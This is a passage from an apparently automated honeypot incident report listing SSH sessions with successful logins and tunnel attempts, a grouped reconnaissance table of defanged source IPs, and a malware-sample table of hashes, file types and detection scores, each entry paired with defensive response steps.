| `2026-08-05 08:17:54` | `cowrie.client.kex` |
| `2026-08-05 08:17:54` | `cowrie.login.success` |
| `2026-08-05 08:17:55` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:17:55` | `cowrie.direct-tcpip.data` |
| `2026-08-05 08:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]42` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80b0bc77c456

| Field | Detail |
|---|---|
| **Source IP** | `34.53.235[.]100` |
| **First Seen** | 2026-08-05 08:19 |
| **Last Seen** | 2026-08-05 08:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:19:02` | `cowrie.session.connect` |
| `2026-08-05 08:19:02` | `cowrie.client.version` |
| `2026-08-05 08:19:02` | `cowrie.client.kex` |
| `2026-08-05 08:19:04` | `cowrie.login.success` |
| `2026-08-05 08:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.235[.]100` to AbuseIPDB if not already reported
- [ ] Block `34.53.235[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90f8e70eec7a

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]29` |
| **First Seen** | 2026-08-05 08:22 |
| **Last Seen** | 2026-08-05 08:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:22:11` | `cowrie.session.connect` |
| `2026-08-05 08:22:11` | `cowrie.client.version` |
| `2026-08-05 08:22:12` | `cowrie.client.kex` |
| `2026-08-05 08:22:12` | `cowrie.login.success` |
| `2026-08-05 08:22:12` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:22:13` | `cowrie.direct-tcpip.data` |
| `2026-08-05 08:22:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]29` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e40919ffadb6

| Field | Detail |
|---|---|
| **Source IP** | `104.155.50[.]249` |
| **First Seen** | 2026-08-05 08:23 |
| **Last Seen** | 2026-08-05 08:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:23:45` | `cowrie.session.connect` |
| `2026-08-05 08:23:45` | `cowrie.login.success` |
| `2026-08-05 08:23:46` | `cowrie.session.params` |
| `2026-08-05 08:23:46` | `cowrie.command.input` |
| `2026-08-05 08:23:46` | `cowrie.command.input` |
| `2026-08-05 08:23:46` | `cowrie.command.failed` |
| `2026-08-05 08:23:46` | `cowrie.command.input` |
| `2026-08-05 08:23:46` | `cowrie.log.closed` |
| `2026-08-05 08:23:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.50[.]249` to AbuseIPDB if not already reported
- [ ] Block `104.155.50[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25e39613984d

| Field | Detail |
|---|---|
| **Source IP** | `104.155.50[.]249` |
| **First Seen** | 2026-08-05 08:23 |
| **Last Seen** | 2026-08-05 08:24 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:23:59` | `cowrie.session.connect` |
| `2026-08-05 08:23:59` | `cowrie.login.success` |
| `2026-08-05 08:24:00` | `cowrie.session.params` |
| `2026-08-05 08:24:00` | `cowrie.command.input` |
| `2026-08-05 08:24:00` | `cowrie.command.failed` |
| `2026-08-05 08:24:14` | `cowrie.log.closed` |
| `2026-08-05 08:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.50[.]249` to AbuseIPDB if not already reported
- [ ] Block `104.155.50[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-575738b2b649

| Field | Detail |
|---|---|
| **Source IP** | `104.155.50[.]249` |
| **First Seen** | 2026-08-05 08:24 |
| **Last Seen** | 2026-08-05 08:24 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:24:01` | `cowrie.session.connect` |
| `2026-08-05 08:24:01` | `cowrie.login.success` |
| `2026-08-05 08:24:01` | `cowrie.session.params` |
| `2026-08-05 08:24:01` | `cowrie.command.input` |
| `2026-08-05 08:24:14` | `cowrie.log.closed` |
| `2026-08-05 08:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.50[.]249` to AbuseIPDB if not already reported
- [ ] Block `104.155.50[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37d878a3d89d

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]227` |
| **First Seen** | 2026-08-05 08:25 |
| **Last Seen** | 2026-08-05 08:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:25:03` | `cowrie.session.connect` |
| `2026-08-05 08:25:03` | `cowrie.client.version` |
| `2026-08-05 08:25:03` | `cowrie.client.kex` |
| `2026-08-05 08:25:04` | `cowrie.login.success` |
| `2026-08-05 08:25:04` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:25:04` | `cowrie.direct-tcpip.data` |
| `2026-08-05 08:25:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]227` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]227` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0321524d7871

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-08-05 08:26 |
| **Last Seen** | 2026-08-05 08:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:26:43` | `cowrie.session.connect` |
| `2026-08-05 08:26:43` | `cowrie.client.version` |
| `2026-08-05 08:26:43` | `cowrie.client.kex` |
| `2026-08-05 08:26:43` | `cowrie.login.success` |
| `2026-08-05 08:26:44` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:26:44` | `cowrie.direct-tcpip.data` |
| `2026-08-05 08:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0339bb0b80c

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]29` |
| **First Seen** | 2026-08-05 08:31 |
| **Last Seen** | 2026-08-05 08:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:31:21` | `cowrie.session.connect` |
| `2026-08-05 08:31:21` | `cowrie.client.version` |
| `2026-08-05 08:31:21` | `cowrie.client.kex` |
| `2026-08-05 08:31:22` | `cowrie.login.success` |
| `2026-08-05 08:31:22` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:31:22` | `cowrie.direct-tcpip.data` |
| `2026-08-05 08:31:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]29` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6792c460388f

| Field | Detail |
|---|---|
| **Source IP** | `130.12.181[.]21` |
| **First Seen** | 2026-08-05 08:31 |
| **Last Seen** | 2026-08-05 08:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:31:44` | `cowrie.session.connect` |
| `2026-08-05 08:31:44` | `cowrie.client.version` |
| `2026-08-05 08:31:44` | `cowrie.client.kex` |
| `2026-08-05 08:31:45` | `cowrie.login.success` |
| `2026-08-05 08:31:45` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:31:45` | `cowrie.direct-tcpip.data` |
| `2026-08-05 08:31:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.181[.]21` to AbuseIPDB if not already reported
- [ ] Block `130.12.181[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fa5da1dfcb3

| Field | Detail |
|---|---|
| **Source IP** | `112.28.73[.]142` |
| **First Seen** | 2026-08-05 08:32 |
| **Last Seen** | 2026-08-05 08:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:32:02` | `cowrie.session.connect` |
| `2026-08-05 08:32:04` | `cowrie.client.version` |
| `2026-08-05 08:32:04` | `cowrie.client.kex` |
| `2026-08-05 08:32:07` | `cowrie.login.success` |
| `2026-08-05 08:32:08` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:32:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.28.73[.]142` to AbuseIPDB if not already reported
- [ ] Block `112.28.73[.]142` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59cc2820af43

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]103` |
| **First Seen** | 2026-08-05 08:34 |
| **Last Seen** | 2026-08-05 08:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:34:25` | `cowrie.session.connect` |
| `2026-08-05 08:34:25` | `cowrie.client.version` |
| `2026-08-05 08:34:25` | `cowrie.client.kex` |
| `2026-08-05 08:34:25` | `cowrie.login.success` |
| `2026-08-05 08:34:25` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:34:25` | `cowrie.direct-tcpip.data` |
| `2026-08-05 08:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]103` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32bc4b9ef3de

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]42` |
| **First Seen** | 2026-08-05 08:34 |
| **Last Seen** | 2026-08-05 08:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:34:40` | `cowrie.session.connect` |
| `2026-08-05 08:34:40` | `cowrie.client.version` |
| `2026-08-05 08:34:40` | `cowrie.client.kex` |
| `2026-08-05 08:34:41` | `cowrie.login.success` |
| `2026-08-05 08:34:41` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:34:41` | `cowrie.direct-tcpip.data` |
| `2026-08-05 08:34:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]42` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0968150da322

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]50` |
| **First Seen** | 2026-08-05 08:42 |
| **Last Seen** | 2026-08-05 08:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:42:35` | `cowrie.session.connect` |
| `2026-08-05 08:42:35` | `cowrie.client.version` |
| `2026-08-05 08:42:35` | `cowrie.client.kex` |
| `2026-08-05 08:42:36` | `cowrie.login.success` |
| `2026-08-05 08:42:36` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:42:36` | `cowrie.direct-tcpip.data` |
| `2026-08-05 08:42:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]50` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d1459da8d31

| Field | Detail |
|---|---|
| **Source IP** | `136.56.34[.]147` |
| **First Seen** | 2026-08-05 08:42 |
| **Last Seen** | 2026-08-05 08:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:42:55` | `cowrie.session.connect` |
| `2026-08-05 08:42:55` | `cowrie.client.version` |
| `2026-08-05 08:42:55` | `cowrie.client.kex` |
| `2026-08-05 08:42:55` | `cowrie.login.success` |
| `2026-08-05 08:42:56` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.56.34[.]147` to AbuseIPDB if not already reported
- [ ] Block `136.56.34[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cc48ed92a59

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]137` |
| **First Seen** | 2026-08-05 08:43 |
| **Last Seen** | 2026-08-05 08:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:43:00` | `cowrie.session.connect` |
| `2026-08-05 08:43:01` | `cowrie.client.version` |
| `2026-08-05 08:43:01` | `cowrie.client.kex` |
| `2026-08-05 08:43:02` | `cowrie.login.success` |
| `2026-08-05 08:43:03` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:43:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5daf746e5358

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]230` |
| **First Seen** | 2026-08-05 08:52 |
| **Last Seen** | 2026-08-05 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:52:31` | `cowrie.session.connect` |
| `2026-08-05 08:52:31` | `cowrie.client.version` |
| `2026-08-05 08:52:31` | `cowrie.client.kex` |
| `2026-08-05 08:52:31` | `cowrie.login.success` |
| `2026-08-05 08:52:31` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:52:32` | `cowrie.direct-tcpip.data` |
| `2026-08-05 08:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]230` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.138[.]58` | **22** | 2026-08-05 05:14 | 2026-08-05 08:46 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-08-05 05:09 | 2026-08-05 08:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **9** | 2026-08-05 05:39 | 2026-08-05 07:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.79.129[.]144` | **9** | 2026-08-05 08:20 | 2026-08-05 08:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `136.64.39[.]43` | **3** | 2026-08-05 07:14 | 2026-08-05 08:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-08-05 06:59 | 2026-08-05 06:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-08-05 08:34 | 2026-08-05 08:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-08-05 08:11 | 2026-08-05 08:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.12.151[.]23` | **2** | 2026-08-05 07:21 | 2026-08-05 07:23 | 2m | 0 | `T1592` | 🟢 LOW |
| `135.119.112[.]84` | **2** | 2026-08-05 07:32 | 2026-08-05 07:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]222` | **2** | 2026-08-05 07:00 | 2026-08-05 07:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `181.224.223[.]212` | **2** | 2026-08-05 06:04 | 2026-08-05 06:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]109` | **2** | 2026-08-05 07:31 | 2026-08-05 07:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **2** | 2026-08-05 05:04 | 2026-08-05 05:17 | 2m | 0 | `T1592` | 🟢 LOW |
| `110.25.105[.]161` | 1 | 2026-08-05 07:57 | 2026-08-05 07:57 | 4s | 0 | `T1592` | 🟢 LOW |
| `112.27.129[.]78` | 1 | 2026-08-05 07:23 | 2026-08-05 07:23 | 1s | 0 | `T1592` | 🟢 LOW |
| `114.96.86[.]176` | 1 | 2026-08-05 06:23 | 2026-08-05 06:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.173[.]110` | 1 | 2026-08-05 07:48 | 2026-08-05 07:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.152.102[.]54` | 1 | 2026-08-05 07:21 | 2026-08-05 07:21 | 3s | 0 | `T1592` | 🟢 LOW |
| `130.12.182[.]225` | 1 | 2026-08-05 08:36 | 2026-08-05 08:36 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-08-05 05:12 | 2026-08-05 05:12 | 3s | 0 | `T1592` | 🟢 LOW |
| `172.236.119[.]165` | 1 | 2026-08-05 07:39 | 2026-08-05 07:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]208` | 1 | 2026-08-05 07:39 | 2026-08-05 07:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `174.75.211[.]204` | 1 | 2026-08-05 05:38 | 2026-08-05 05:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `211.238.237[.]254` | 1 | 2026-08-05 07:33 | 2026-08-05 07:33 | 1s | 0 | `T1592` | 🟢 LOW |
| `221.159.21[.]170` | 1 | 2026-08-05 07:22 | 2026-08-05 07:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `31.148.135[.]139` | 1 | 2026-08-05 05:13 | 2026-08-05 05:13 | 10s | 0 | `T1592` | 🟢 LOW |
| `34.53.235[.]100` | 1 | 2026-08-05 08:19 | 2026-08-05 08:19 | 6s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-08-05 07:05 | 2026-08-05 07:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-08-05 08:35 | 2026-08-05 08:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-08-05 08:39 | 2026-08-05 08:39 | 5s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]32` | 1 | 2026-08-05 07:38 | 2026-08-05 07:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.126.16[.]66` | 1 | 2026-08-05 08:53 | 2026-08-05 08:53 | 30s | 0 | `T1592` | 🟢 LOW |
| `64.227.99[.]233` | 1 | 2026-08-05 05:53 | 2026-08-05 05:54 | 8s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]80` | 1 | 2026-08-05 07:29 | 2026-08-05 07:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]136` | 1 | 2026-08-05 05:49 | 2026-08-05 05:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]208` | 1 | 2026-08-05 05:22 | 2026-08-05 05:22 | 10s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]42` | 1 | 2026-08-05 06:13 | 2026-08-05 06:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.239.108[.]218` | 1 | 2026-08-05 06:57 | 2026-08-05 06:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.239.49[.]141` | 1 | 2026-08-05 05:04 | 2026-08-05 05:04 | 13s | 0 | `T1592` | 🟢 LOW |
| `89.222.217[.]32` | 1 | 2026-08-05 07:17 | 2026-08-05 07:17 | 13s | 0 | `T1592` | 🟢 LOW |
| `95.95.213[.]184` | 1 | 2026-08-05 08:29 | 2026-08-05 08:29 | 14s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **33/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 44/100 | 🟡 MEDIUM | **34/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
